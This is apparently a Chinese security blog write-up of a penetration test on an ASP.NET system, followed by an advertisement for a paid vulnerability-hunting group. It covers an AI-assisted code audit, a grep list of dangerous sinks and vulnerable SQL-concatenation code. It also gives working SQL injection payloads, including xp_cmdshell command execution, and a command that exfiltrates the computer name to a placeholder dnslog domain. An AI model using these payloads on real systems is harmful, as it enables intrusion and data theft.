#  记某次渗透测试从未授权信息泄露挖掘到白盒审计-sql/rce漏洞挖掘  
原创 陌笙
                    陌笙  陌笙不太懂安全   2026-10-08 09:00  
  
免责声明  
```
由于传播、利用本公众号所提供的信息而造成
的任何直接或者间接的后果及损失，均由使用
者本人负责，公众号陌笙不太懂安全及作者不
为此承担任何责任，一旦造成后果请自行承担！
如有侵权烦请告知，我们会立即删除并致歉，谢谢！
```  
  
漏洞挖掘  
  
某次渗透测试的时候,搞到这个系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRu97GqBcibJsQot4clKf6qAUshkw8hyYxibXTLnJ2TNnhHZnxc9B3sIqMgb0KZ1x1kzyzS2l16WlkDasdNVlF1dgKoR7iaFJgjAA/640?wx_fmt=png&from=appmsg "")  
  
依旧是最最最亲切的登录框  
  
简单看看架构是IIS+asp架构的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSDbvS8iaFhodqDX4E8ghF45AWKlAal47fwmMToz4dibmWA6YztbzgEZR1ib0xtBOA1y6B6BUpvDBM57zSZy6l3NbByWAJUNnGvnM/640?wx_fmt=png&from=appmsg "")  
  
看看接口，果然也没几个接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSVhjQdmBlhfK0lgBmQmAiaibKxsEnYuMfdjT3Lgw1GicLG3cG9FGictbV1JKw2WrmLYJYNw97iaYgicq6xpHhteTSP8emzjlWIxWh0U/640?wx_fmt=png&from=appmsg "")  
  
随手拼接两个，试试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSoiciaQ6pYS9jTKv8f327mWNGu9guJ2ia8fQadT2ib4E8u9NmOrLw3D5fflPPVWqo1lIR7eJew0bRCSy7HF98sAw0JoiaicXcDEv6dI/640?wx_fmt=png&from=appmsg "")  
  
这个获取登录账户的list的接口出了一点东西，但也只是一点  
  
js搜搜这个接口，看看是不是参数的原因，显然不是  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTW6baQLWOHs8uC0VKkEpuGnicSrxNXEiaoTPOaP7ziae9mia9nibage05ZACVK63ic1ulwnxic7SR0zgSC0ic2TqnD5BPibIltkiaRo5WfU/640?wx_fmt=png&from=appmsg "")  
  
这种asp的站，扫扫目录，一般可能会有突破点  
  
打开我的无影，配合祖传秘制大字典，扫扫看  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT0Y7dNXxHXAp9jDJJbkibiaZLZ4S0yUQdTYYIpSe7NY9sdhfic6zBfziaoU0nKxibibFGZuBicBIm0GWSNxNvqsWoMjKaA2gPCaSriaLE/640?wx_fmt=png&from=appmsg "")  
  
发现一个  
/content/  
目录遍历,都是些前台文件没啥用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQCaz0o55UMcHEVFZA0a2ht76SEiaibibHZBXxSQkOsbY7AXpP4EF5gzJWqDyhgtCiankEBZpQ1ryK7R2YLbz32ibBz7icktlIEQoMzw/640?wx_fmt=png&from=appmsg "")  
  
/image/都是些图片  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSworso24THDJhib78dWibDpiakEeIdsJVz0Jmch5XVansZvUbeJjRQNdknn15QIC1rQq3FypJE4nZtLu6picqeyYdHPJxZAgB09P0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSiczHib9icjgg1xXQDPACxQaNJKxMCyXwztHtOiaHhw1c81ibEQk2Y6HT8E6P3DA1TpsV6BFqMQBdRzjtvwBj7jKCvZ7Yr3DlXVgnU/640?wx_fmt=png&from=appmsg "")  
  
草料解码看看  
```
https://cli.im/deqr
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR84MJtvuk3Ogf3e7GQIdAIM9YSYsGQQUETsox0ZaT6GFJDJd7RQibTF6nuxAFy0fk322Ts14dcAhTa3iamQz2rkicYYkZAfBV6ick/640?wx_fmt=png&from=appmsg "")  
  
依旧没卵用  
  
后面多试了几个，发现这个接口/  
reports/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRdxKOulJokoBxEianz7FMicq227TwgoicIS72oZ1JE8K5eoSRdRpX6EEF8icPDKhaQWgQdU2EibVXibZOS3qicTdjLbXPHX5c2Wrh63Y/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTHkxryJznEsISkibFdzMnGohicYShjqK1LoK1Qa2NHde1Xkjcxzn6icUcD0A5e2W3x48vpFceL5abZ1Tzy4O60kP5nYIScJSL3x0/640?wx_fmt=png&from=appmsg "")  
  
有一点用但是不多  
  
抓包看看，能不能搞弱口令  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTqibOkwYFHdeicyVTpM0iaFMEVu9R7jhkuibFVRGeJJ7sk8fDLghFeaoMrcPPy2qrqAHJRB0oDibFvyYYiaeYGjwAMGMibk3pb3icqVEs/640?wx_fmt=png&from=appmsg "")  
  
可以简单固定密码爆破用户试试  
  
看看请求头  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQuKAy703rvw7qbU6Q0ByZAakv600bWQfgdjBB1tnhf7Aibgtqw3uxn3LeyP4AiaaENG08qPzDId6n2iaQcibSlGKSp65z3QibHAAP4/640?wx_fmt=png&from=appmsg "")  
  
发现cookie里面，有一个没有见过的字段，搜了一个发现是个框架  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQJ5jErFjkyDNZpg7QNzma9icLrqiaxicZm7K8dPZHvicf371Cf5r8ia1iaoaIOyE4kmsTLZ8XnIAdmCQR39SEwQicG6ibCw5j1F9Nv70U/640?wx_fmt=png&from=appmsg "")  
  
github搜了搜应该是这套  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQOA6ljveQicUPHADH52ibU9ySM63PRdDiccrzY4liaasm386T5h37kDkGz9CibAks3HssicTBsiajucCe0pZeqwnpdq0UfKYOeC3DQ3Y/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRCicXqo0uXicI9a3RvF71sFxbL8hM06wZgpXeKSknqibXVDnF8ujncbTfvXNCmbgMuyj0LIItMvXUC3SbzDUn5bYL40l12TmaG3o/640?wx_fmt=png&from=appmsg "")  
  
版本号也对得上，现在就可以黑盒转白盒了  
  
先看看思维导图有没有漏的点，常见的也都测试了，可以看看白盒了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQMHJtDo0EeApO6jVyLvHJjmmJ6hBo1vOyBKvK2ic0DSN8OTXoiciboGqeO0zaWhEfLXsqhgbVcXRx6KA4x2iadLbls0tDJicAxQyI8/640?wx_fmt=png&from=appmsg "")  
  
但是再此之前，必须让我的ai试试黑盒测试，试试  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTrpEPEAfaicRdExQfeygXS5aa42pvNHFFG2tpu5KV37ncoicI45Qic3rnlmYFNt9DnYyC1YHASLGOw3dGHIsf4ISNDrdUSmZQ33E/640?wx_fmt=png&from=appmsg "")  
  
几分钟后，产出了这么多，看来ai的能力应该略胜我一筹，哈哈  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRWaHLdzvPPWkV2yVgibGYlc704SOUia7gxsfMFgZR71SyKarNBZhmwU6HiahyH7ZODNbzMdJkwHU1tJ2rCzGiaOCAwnwK8EdIRKj0/640?wx_fmt=png&from=appmsg "")  
  
手工复现试试，无需多言  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboS2cLGjicDPAhibnuQVIaaiczAE8yZ0BOribJwEKMzkOsfXIdywMCHPnqRsU4vBvGVWTVibUsvMA5FbCRlRIcpiat8GrHbDwlSjj7t7g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQsib5M6bn32ticSw3FfDye4M9xYqgabr9xjmib7Ph6M5Xmt5V61J17EicIribexZlxnBJbfCJdpvyZBiat206Vj5TZtQnm30f9lmJL8/640?wx_fmt=png&from=appmsg "")  
  
不是误报，但是都是一些未授权  
订单  
信息泄露，我们直接搞更有危害的  
  
众所周知ai的白盒能力也是强的一批  
  
直接打开源码目录给他代码审计  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSHUbt9v8Squ6XQwr3Lj62dabF1pa94JGNgvXdQdp4IEVichl0XIpVyfIee1CcDYibQWOVmW0lwHbJ6WvHWnwL9A3KS7iadiabzWx4/640?wx_fmt=png&from=appmsg "")  
```
典型的 .NET 后端框架，
包含：
C#：核心业务代码、框架类库
ASP.NET / ASP.NET Core：Web API 或 MVC 层
SQL：数据库脚本
JavaScript / HTML / CSS：前端页面部分
```  
  
几分钟之后，依旧不负所托  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRLlnzw5Q8kXKn6WuHS0JniazPsH6HxawXc5ZJ4OWvM8J1RCeibbfKlyKia9B9lo8JgzRWMicVukhkoy7UMPNic6hFhuibsfLRMicT9ds/640?wx_fmt=png&from=appmsg "")  
  
我们打开源码，和ai学习一手，.net的审计思路  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQloLPyhWrmj6ooicqINx4wVye1aAaiaBCqbReuibVsaHqlmqDhCZ1JBa5gDFaekpOGWKrrCpLLFib0CUCEsBPet0BhfweJajjyCQk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1QOZicX6aPo37Vr6CPXswRLrNyrWUBmmQiaWSXGOuGrO9l2hTrzLXjEdkSwn6ZpXtbLjMibx6IqibC6ToJRoDvABn7jibhGa1zmKk/640?wx_fmt=png&from=appmsg "")  
  
说了一堆，思路就是这个  
```
1) 定攻击面：FilterConfig / 鉴权注解实现 / 控制器基类 / Ignore 清单   ← 本次 4 个文件定位半数结论
2) 列 sink：grep 危险 API（下面的清单），逐条"三问"：
   输入可控吗？→ 中间有校验吗？→ 能到执行/数据吗？
3) 抓语义：动作名(Reset/Delete/Save/Export) + 参数名(keyValue/id)  ← 越权重灾区
4) 查配置：web.config / system.config → 密钥、上传路径、连接串
5) 看 Service/BLL 层 SQL：拼接 vs 参数化的"差分"就是 bug 坐标
```  
  
Sink grep 清单（.NET，直接抄）：  
```
grep -rn --include=*.cs -E "Process\.Start|cmd\.exe|powershell" .            # 命令执行
grep -rn --include=*.cs -E "TypeNameHandling|BinaryFormatter|LosFormatter" . # 反序列化
grep -rn --include=*.cs -E "Path\.GetExtension|SaveAs|WriteAllBytes" .        # 文件上传/写入
grep -rn --include=*.cs -E "WebRequest\.Create|HttpWebRequest|HttpClient" .   # SSRF
grep -rn --include=*.cs -E '"SELECT|"select|"UPDATE' . | grep '" +'           # SQL 拼接
grep -rn --include=*.cs -E "XmlDocument|LoadXml|XmlResolver" .                # XXE
```  
  
我们重点看看sql这个漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboS4Z3FP1eicyiajaMjPWouhJTWKfJicelD7JchHhPqS8udplLMwEP4llbpiaZcnSwr927zC3oazicqrc8TMSccDmhgUnKNMGnu6W1u4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTicexZN1EJewEeD3sWNxEz0jUjnMTuPrSJwWE88jgT4eDxg2vC8L4dqhYeK79OERNqX3nTyQGiamOZJg3r4kx9KH02lUo1bFOX4/640?wx_fmt=png&from=appmsg "")  
```
public static StringBuilder SqlPageSql(string strSql, string orderField, bool isAsc, int pageSize, int pageIndex)
        {
            StringBuilder sb = new StringBuilder();
            if (pageIndex == 0)
            {
                pageIndex = 1;
            }
            int num = (pageIndex - 1) * pageSize;
            int num1 = (pageIndex) * pageSize;
            string OrderBy = "";
            if (!string.IsNullOrEmpty(orderField))
            {
                if (orderField.ToUpper().IndexOf("ASC") + orderField.ToUpper().IndexOf("DESC") > 0)
                {
                    OrderBy = " Order By " + orderField;
                }
                else
                {
                    OrderBy = " Order By " + orderField + " " + (isAsc ? "ASC" : "DESC");
                }
            }
            else
            {
                OrderBy = "order by (select 0)";
            }
            sb.Append("Select * From (Select ROW_NUMBER() Over (" + OrderBy + ")");
            sb.Append(" As rowNum, * From (" + strSql + ")  T ) As N Where rowNum > " + num + " And rowNum <= " + num1 + "");
            return sb;
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ4iaGQg3iakYWtSAYLgAhHVhicOVNVuIXWZYbibibRKdLeytYoa32kWWvDEPZcztVe98ib5alC4tUc2eAa3aor7UwaVggLHkicgEddlc/640?wx_fmt=png&from=appmsg "")  
  
简单的一批，就是我们常见的排序注入，没有对我们传入进来的排序字段做任何过滤直接拼接sql语句然后执行，从而导致sql注入漏洞，漏洞点，确定之后，就是看看鉴权，路由，构造数据包测试就行，其他的就不一个一个看了。  
  
直接拿着ai给出的poc复现试试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRRzcMO3XJkIrZx9HGnMjLNekj4Bbq76CnHxLGicibMz8klVa5OYQtmU2RTj6qJFg38K7ibL1xwicQ2icMVMuYe62dsyQhqLPcAm7ZM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTfjm4VibSibPXOacnkYXh6F8b2Nr7J7Z8qIBCflPt579GhBt5k3zlAgXFxNB4YQpe9ichzsfaaqkib3ZNOicvFiaa0lTdI0z5Uzia3Co/640?wx_fmt=png&from=appmsg "")  
  
然后尝试rce试试  
  
看看sysadmin权限  
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTyQ03uczIEBP2jBzVvWnibFg8doEHCaCibuxdR4Wibt6rpwIRyMdmIV8CibpXjX54rVQrV0ePdswmByClQFvW7GEeJkN5QhHu4vfA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSL7eepT9Lo38tJmyme7c8oPDP8vWAOlwicXV3QHo2Pxrpbe24sYLuoHx10X0wemFduXwgQRePkquxE90R5LjbPrDqueFMDIhYg/640?wx_fmt=png&from=appmsg "")  
  
是sa权限，在看看xp_cmdshell的开放状态  
```
(SELECT TOP 1 CAST(value AS int) FROM sys.configurations WHERE name='xp_cmdshell')--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTQBfzF0t13Al0AJBic0qvLWaR5gnUexhpniaIHwpVUD1nThLdksJpdybOAgOo4jbQ0h3JgIakTZWzpjTgZH2mTXKl96TDY2xXNc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQp7ketdYwXibXh9jDPEUF0TNRC5ia3jicNLS1RczJklXloeE4sK8ezINnag4dy4N8TrJHpGFyuPcprjDwTt9g2BWIJa1QviaSOOvA/640?wx_fmt=png&from=appmsg "")  
  
xp_cmdshell也是开放状态，直接rce  
  
堆叠查询执行服务器命令,这里直接使用ping包的次数配合时间进行验证  
```
111';EXEC xp_cmdshell 'ping -n 7 127.0.0.1'--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSPsMiagsR1LLK6fBwhNbuNp69Nz56JWtMkSRQxsZTeHwGjialgYFxo8GozW6miaH2tjwH8rmTQRmWutjAHx8XOrCz10cWVLBS7Ac/640?wx_fmt=png&from=appmsg "")  
  
ping7个数据包，时间是6s  
  
ping5个数据包，时间是4s  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQVrW5zzbibLYP3wAicChRwpceibn6YoHLNwAL79wxfbLav9nRoTvr85ibxANM5Oqbwic6blUDUfZqkZQvr49kDbbFDb7OsffdKR87k/640?wx_fmt=png&from=appmsg "")  
  
ping3个数据包，时间是2s  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQmcZMBS48CtKBBhBfxdsfUxkFgIH2iaOwYcq5dnoicrqVkiaTU1Olun9QSdSLsibh8fQw49vdI5ZKrLhDMfqslD4o3lzszrSib5jWY/640?wx_fmt=png&from=appmsg "")  
  
成功证明rce，或者可以直接外带证明更明显  
  
这里可以直接外带计算机的名字  
```
EXEC xp_cmdshell 'ping %COMPUTERNAME%.你的dnslog域名'
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboS1cQwvW8JIc97wMRxTraOpBiamEjI4ibdiavOJU59zqfMXpo7p9oFl7oBFJCZOpG2KWrwQBecicXKekHWtLuZ2iayIPWyCbb4Nia0pU/640?wx_fmt=png&from=appmsg "")  
  
成功外带  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQu6710zDVKlZFIXsmU51Z9RP65C3c3bVPiaKMwQ0JspX7QRqYNKmwZ8KEXwdTLIbMIpGu0Zu5ubUicbgV2fhhuQav81vR77yues/640?wx_fmt=png&from=appmsg "")  
  
后面就可以反弹shell，或者下载执行木马，上线cs，梭哈内网了  
  
点到为止了  
  
  
  
**后台回复加群加入交流群**  
  
****  
**广告：********cisp pte/pts &nisp1级2级低价报考**  
  
  
**陌笙安全纷传圈子+陌笙src挖掘知识库+陌笙安全漏洞库+陌笙安全面试题库**  
**简单介绍****（**  
**加入纷传圈子**  
**送****知识库+漏洞库+面试题库****）**  
                          
  
如果觉得合适可以加入,圈子目前价格  
39.9元，价格只会根据圈子内容和圈子人数进行上调，不会下跌。。。    
  
  
**圈子福利**  
   
  
**edu漏洞挖掘1v1指导出洞**  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKQWHxLsRrPqpqdiceX76d7yExQIyOqFmmJAfHQh7qzKvPc2V5z6iaa0RY6Ib8AsGvgS5MKkAk5aaHnJBaSnI10LDKQYMLcQMmg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR8pnPeapLBK4Jsa4ufCvFoGL66t7PKeZyA3AjNxsObjtnCibN2gzGX7NMS7Wo5sj3YYL2iboeRuQDcWqiapc8xuo5fticoBG4DsyY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRKIBNIQIVicRWJLbyGRmg92vPzc8375PJpcYVvfywzwqnaeBicZuEbfvuic9KRdjwkahSDic5VqrH2Mb4NkqtkADl5HLIh8gPex60/640?wx_fmt=png&from=appmsg "")  
  
**skill+grok辅助挖掘某企业sr**  
**c****实战效果，能出但是重复多，agent独立挖掘也可以，见仁见智，看个人习惯，好的模型是最重要的。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQwyn779TTwY7vZkePQCL8k3K8dYxNdyzfgADL4dJcNUvpmodLeDVCZ6xDC4RJXEBmO2tcWqgUNdTVicKTW0jpdsg7X6xwP5gIQ/640?wx_fmt=png&from=appmsg "")  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQnIqagDL2A4BUIXrib9YVmATWuaIDqETqYd9ToHib52mDyoMyqc6Wzh733FRnbsDsGgey7B8s8jr72UtkPY6ich58niaPJqoItKcE/640?wx_fmt=png&from=appmsg "")  
  
****  
**企业src边缘&核心资产实战效果&&有重复但是证明好模型+AI确实够用**  
  
**（图片仅供参考，我出不等于你出，见识到ai神力即可，多去用AI!!!）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboT1YNI9U6r6NMO4UMUBROoWeC4XQC4Dge94ODZ7tXY6tbxqb3IJoghve0u1SfkygE5UJ5HTdUBvLZKrn5ps13F71piax5dlHnOE/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTGjdxKy4nllaLXIznTvRqicichITccuB8psYFRYakw6ViauCk6iccziahfPw4fnrqhyCp7Zkq7lRI0DOicyrZlNyicYibTVibfGFZVaG0c/640?wx_fmt=png&from=appmsg "")  
  
****  
**不是P图,单洞1.2w记录**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQQpQdR2Ttwqxibyr75Is0kBG2N2tLYQIaau7SS278oyQ4RDpNScviaMt4wtlfgDCibE05WgoMhE5kZUrP8ciaYIdnxA594wsmoAAs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSRn2EsfFkA5mG6dcn7JLQMroc2dy3EQb3ueY2Cspd0WYgicXEnSF68UD43nNd4plkxmkTpEOh2kkQMEWZZIjE0ibA8r1q4IfiaxI/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙src挖掘知识库介绍（内容持续更新中!!!)**  
```
信息收集(主域名信息收集,子域名信息收集等&会永久提供fofa-key助力)
弱口令漏洞&未授权访问漏洞挖掘
任意文件读取&删除&下载&上传漏洞
sql注入漏洞
url重定向漏洞
csrf&ssrf漏洞挖掘
XSS&XXE漏洞挖掘等等常见漏洞
cors&目录遍历&越权漏洞挖掘
EDUSRC(证书站挖掘案例分享&edusrc挖掘技巧分享)
CNVD挖掘技巧分享&实战案例报告编写
公益漏洞挖掘（公益src挖掘漏洞分享&提供补天1权重资产）
SRC挖掘实战(针对各种常见功能总结的常见测试思路等快速提升)
经典常见Nday漏洞(常见中间件&以及各种常见框架)复现
云安全相关漏洞挖掘（云key扫盲&云存储桶&快速识别云环境&云攻防）
AI相关学习（AI基础&AI代码审计实战测试&webLLM攻击等）
APP&小程序漏洞挖掘
等各模块不在一一介绍
```  
  
信息收集  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTu9DGyTubluhYicFynwVBKa4V06sDfEVKOyk5Q4ghZzLMDAuLb1M1oR4RJumGWrADPapFjTrOjpksKQ8q0YYCnl3ZWLof8Knzg/640?wx_fmt=png&from=appmsg "")  
  
src挖掘基础  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboR45bibbJEb28a1gS5yth3r5HyOsgPiaOUHHYriahZyIyrk0LMOsHW4VoDibyBRibTNzptGiaLWX62UwykicwvbxCJPopvklqiaxML8lS8/640?wx_fmt=png&from=appmsg "")  
  
src挖掘实战  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTKWnTsN6CXf3djhXIlMKNRjVmJn3g5b23ur9E6Cx3O68f0hXVjCiaj8J4RYeTGBecqf1k99phG0ice2wtd5lKgR46OeqeLQfMpk/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRbZ1HYm7R7YEiaxRVQibGWyricx9l7HpGjS4ZfWRdlft8iacwkpzYyZfmYEkWdJgYRORPkNFR6dADR5MyE524tWX6cAwN8MmrCZu0/640?wx_fmt=png&from=appmsg "")  
  
  
edusrc  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQVVlTXhibjR8UiakZBQicXRZrQ7hdoOz5G8MQrcuDBGbqJdO0kIz6R9IU4ObAeOiabT8pr6lc7jibdIkKoTjiaXNHPLAwAB3BV2UvLM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSCrvarBbzP4L9kS6P0LVH9JMdmcbFDKiaicHqMFgTxq3x4iatjDJQicmc7NPC14C9Fk3icFjrouSgNVaN8Byuf0C0Iq9O6D1XPvFvY/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRALwXmgZ4mh2LW0RdicrKjBCP7P1iaF14G0Eq2v3KRnTJORpwXZlF58WEz6QicxLJpyJaA5iah5CF2rHjBz4JzOELFRaZTAKOQ2tQ/640?wx_fmt=png&from=appmsg "")  
  
经典nday复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboRu8Gf849iaCkSBxLL8IlzJTRs185QicEe9l5UGI1dEVKISt2IGGveZynXBW9tIUsxNsz4adSTib7rib50uSJdjNfTvVRFrbPJhzL4/640?wx_fmt=png&from=appmsg "")  
  
  
云安全&AI安全  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQ9qiavETNjaaX162czpNCqpw3uJqVpicbI15AXzhf5x8icmHxBdTGOgRgzNPGF3Aw2gglT4Fx09JGXYibQC6U7CQKVmoH08l3meia4/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQgcsjiaZ4S26TWowHfpBkhSeHf2pjrcDyicJuia3uqvRBauLEOicibibEMqibnBMtjopFL8No7UXNibbURvzeJ3dQHTibvGxRQGnorb4co/640?wx_fmt=png&from=appmsg "")  
  
**陌笙安全漏洞库介绍**  
```
最新漏洞查看
1day&0day分享
EDU学校相关漏洞
Web应用漏洞
CMS漏洞
OA产品漏洞
中间件漏洞
云安全漏洞
人工智能漏洞
其他漏洞
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboTFBRMa8XwYxfcZMyXicx94xSKxawPcqFia2rJKOL7fSLYXiccwHc868XxNGIQ5z7ibiaI1MNAGRrK7U6wXJTsZOCAu2I5XV1boTAL4/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSBzdakI9XI33ReAm2dxO8vgzw3JicQmUuWCb5ayBlKR1PoQHEHFETteBnicyupwU0mXvXibfrDoyg8nSWBGoK1p2YXY3ElhcvOQ0/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSajCclDhuRpaLic9Ld915CHU7RqSC1LCrPGfNZiavdPEVeDedDWOPBhtMLCicTp3RNd1lT0Pmfo3mx5B0hUxbQg3ic6Via90NMtZVk/640?wx_fmt=png&from=appmsg "")  
  
****  
****  
**陌笙安全面试库**  
```
渗透测试基本问题一汇总
渗透测试基本问题二汇总
渗透测试基本问题三汇总
微步护网面试题目
长亭科技面试
深信服护网面试
启明星辰渗透测试面试题目
安恒面试题目
绿盟笔试题目
360面试
奇安信护网面试
运维面试题目
运维面试题库
网安面试相关文档大全
相关面试文章推荐
等等
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSoLqEzH0a3A4LQrvTIkGx81Sh5pf6fCoEQJhYg715vrJicSkfBuCoAmV2Kp4uOMe5jcUZutPwicibFibtJ1ZmyiaAibCg0XicWnsNcicE/640?wx_fmt=png&from=appmsg "")  
  
****  
**POC库****&&更新适配afrog&&nuclei&&dddd的POC&1day/Nday等&&**  
**dddd二开****工具[助力渗透测试&&红蓝攻防]**  
  
**工具截图**  
  
****  
**实战效果**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboSKqLXNcOPE07xOwOUCjRGuFphopPumW9RaticmNCuEUXu52GtdTTfpTUicrBj80kMcZzJsnps3abyvXIvLHEIhvMoXUApOqZCe4/640?wx_fmt=png&from=appmsg "")  
  
****  
**poc库【后续持续更新】**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboTG9Lyp44aFffUOxQKtHjToGfqFWTjswYft0VtAPINtV5MqmrTTj8GWrVb6yowvHURubPgOqdribmibWEb0Fcj3YdN4iahUwItcxE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboRAMJIIvexOOJa5KhrsKmlsx8bkwib9SPoK72Q0OSPWR5qx67yvl8scMQ5bg8caBXZH01kM39RDnKpnWSaTicgobRmLygERGFWls/640?wx_fmt=png&from=appmsg "")  
  
  
**AI赋能-**  
**skill辅助**  
**漏洞挖掘（免责&&慎用）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboR3Dib0RVxVhUOzS6ibC6BvkfulXQAclic0XCXMS35C4EPoqX1b2eMVj2CFiaLCelVs1szGibaHiaAq7WibRdwHUg0IwO8fjDdWxNv6eY/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboSXZZVels2NibmHgyxntlCRNIkgoqMPfUPwSM9O43OqniaZLDEJic9QRkW01gNTydFkibdI6yBRkJJ1sDUmfl7iaicoibz1QLp0J2pWE4/640?wx_fmt=png&from=appmsg "")  
  
  
**圈友skill+ai辅助渗透**  
**实战效果**  
**，支持打假！**  
  
证书站  
  
![](https://mmbiz.qpic.cn/mmbiz_png/MSDUaqtwboQibuxKAyHBZicB1t5yGVKyV82Teo8C2MbjKPytKziaXUcjPiao8ylHbD4vicAld8equC9alic3NksvWJ09wArXaPXZD10vjPtfoia4Vg/640?wx_fmt=png&from=appmsg "")  
  
普通站点  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/MSDUaqtwboQ1Xt6gdLgd2d1mf8QURQX4YZjHA2uIw9GdTuxzSafBVOJzrQVmHJlqdhVWdVDj3OQsiaQhYOaoiabXc6EgajvBMvB6xBZwdJkIQ/640?wx_fmt=png&from=appmsg "")  
  
****  
**陌笙**  
**纷传****圈子介**  
**绍**  
```
1、src挖掘思维导图，信息收集思维导图，edusrc挖掘思维导图，以及后续的红队&面试思维导图&自己网安笔记等持续更新
2、2025-2026的edusrc实战报告包含证书站和非证书站以及2025之前的各种优质报思路分享
3、各种src报告思路分享（内部&外部）
4、分享各种src挖掘&edusrc挖掘培训资料&视频
5、不定期分享通杀、0day
